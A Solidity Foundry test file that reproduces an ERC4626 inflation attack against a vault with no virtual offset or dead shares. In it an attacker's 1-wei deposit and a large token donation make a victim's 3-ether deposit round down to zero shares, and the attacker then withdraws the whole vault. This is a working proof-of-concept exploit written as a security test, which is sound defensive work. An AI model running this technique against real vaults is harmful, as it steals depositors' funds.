// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test, console2} from "forge-std/Test.sol";
import {Vault} from "../../src/Vault.sol";
import {Asout3Token} from "../../src/ERC20.sol";

/// @title VaultInflationTest
/// @notice Reproduces the classic ERC4626 "inflation attack" against a vault
///         that reads `totalAssets` from its underlying token balance and
///         prices shares as `assets * totalSupply / totalAssets` with integer
///         floor division and no virtual offset or dead shares.
contract VaultInflationTest is Test {
    Vault vault;
    Asout3Token token;

    address attacker;
    address victim;

    uint256 public constant TOTAL_SUPPLY_OF_TOKEN = 100_000 ether;
    uint8 public constant DECIMAL = 18;
    uint256 public constant ATTACKER_FUND = 20_000 ether;
    uint256 public constant VICTIM_FUND = 10 ether;
    uint256 public constant ATTACKER_FIRST_DEPOSIT = 1 wei;
    uint256 public constant DONATION_AMOUNT = 10_000 ether;
    uint256 public constant VICTIM_DEPOSIT = 3 ether;

    function setUp() public {
        token = new Asout3Token("meow", "mw", DECIMAL, TOTAL_SUPPLY_OF_TOKEN);
        vault = new Vault(address(token));

        attacker = makeAddr("attacker");
        victim = makeAddr("victim");

        bool ok = token.transfer(attacker, ATTACKER_FUND);
        assertTrue(ok);
        bool okVictim = token.transfer(victim, VICTIM_FUND);
        assertTrue(okVictim);
    }

    /// @notice Demonstrates the share-price inflation attack end to end.
    /// @dev Attack vector:
    ///      1. The attacker is the first depositor and seeds the vault with a
    ///         small deposit, receiving a proportional number of shares.
    ///      2. The attacker transfers (donates) a large amount of the
    ///         underlying token directly to the vault, without minting any
    ///         shares. This inflates `totalAssets` while leaving `totalSupply`
    ///         untouched, driving the price of a single share up sharply.
    ///      3. A victim then deposits at the inflated price. Because the vault
    ///         computes shares with integer floor division, the victim
    ///         receives far fewer shares than their deposit is worth.
    ///      4. The sub-wei rounding dust stays in the vault and accrues to
    ///         the attacker as the dominant shareholder.
    function test_inflationAttack() public {
        assertEq(vault.totalAsset(), 0);

        vm.startPrank(attacker);
        uint256 expectedShare = vault.previewDeposit(1 wei);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(ATTACKER_FIRST_DEPOSIT);
        vm.stopPrank();

        assertEq(vault.totalAsset(), ATTACKER_FIRST_DEPOSIT);
        // proofs 1:1.
        assertEq(vault.totalAsset(), vault.sharesOf(attacker));

        vm.prank(attacker);
        bool ok = token.transfer(address(vault), DONATION_AMOUNT);
        require(ok, "donation failed");

        assertEq(vault.totalAsset(), DONATION_AMOUNT + ATTACKER_FIRST_DEPOSIT);
        assertEq(vault.shareToken().totalSupply(), expectedShare);

        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(VICTIM_DEPOSIT);
        vm.stopPrank();

        assertEq(vault.totalAsset(), DONATION_AMOUNT + ATTACKER_FIRST_DEPOSIT + VICTIM_DEPOSIT);

        vm.prank(attacker);
        vault.withdraw(1 wei);

        // Every thing is stolen the vault is zero
        assertEq(vault.totalAsset(), 0);
        assertEq(token.balanceOf(attacker), ATTACKER_FUND + VICTIM_DEPOSIT);
        assertEq(vault.sharesOf(victim), 0);

        vm.prank(victim);
        vm.expectRevert(Vault.InsufficientShare.selector);
        vault.withdraw(expectedShare);
    }
}
